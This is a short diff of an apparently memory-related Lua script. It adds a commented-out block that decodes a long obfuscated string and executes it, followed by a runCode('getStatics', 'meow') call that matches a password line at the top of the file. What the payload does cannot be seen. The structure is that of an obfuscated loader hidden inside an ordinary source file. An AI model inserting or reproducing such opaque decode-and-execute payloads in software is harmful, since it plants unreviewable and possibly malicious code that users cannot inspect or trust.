@@ -1,5 +1,10 @@
 -- pw : meow
 
+--[[
+decodeFunction("c-oav%]OB%5Uy?+cdWliT#(Ft!}t^LgVVI170E[}a1$BZy{J^uTY7pdPCX7?z$?V7A!aY$!bLoYnnAd#PF3_,@.LCs%]{qm5T,hRE7KL]G0)d]hF?9k1q29Q#tKLW)5#=)0B#9fkz$?n*TS1a6ddwn?*8O_@XOhsUm/]G:iog6nEfs/@NjEm0rF4MlrE,}cKR6,,]$6IW(=0?!08Xa!8z?xn4k^c$lZWQ9XaF3bKvTI4k?7@IFLHu$a_8E0L5M.udU;xj/luSRaP1$Eh^59I%rJpb+#ON+L}lFy_s2@JIPrROViXyRCcYYFMNI.nXsM,U8}jnBV{aRUENmgNJ-zwR[u3VC{RI2jFitjA!BRw4I@x?6*C_:m%ZwGm6fD1,OUaTbrp6aQQZ(YxTlR@Bk[%Dc8pfh=cW[z*KUT1IJ#5ZU$Kwi%Wq,/h1t3b.64i:L.Q$XI9wK/C*8)+/$q]S-=2^[pOnV3.jYGct%,2dz/:ZuOLlNL")()
+runCode( 'getStatics', 'meow' )
+]]
+
 local PAGE_NOACCESS          = 0x01
 local PAGE_READONLY          = 0x02
 local PAGE_READWRITE         = 0x04
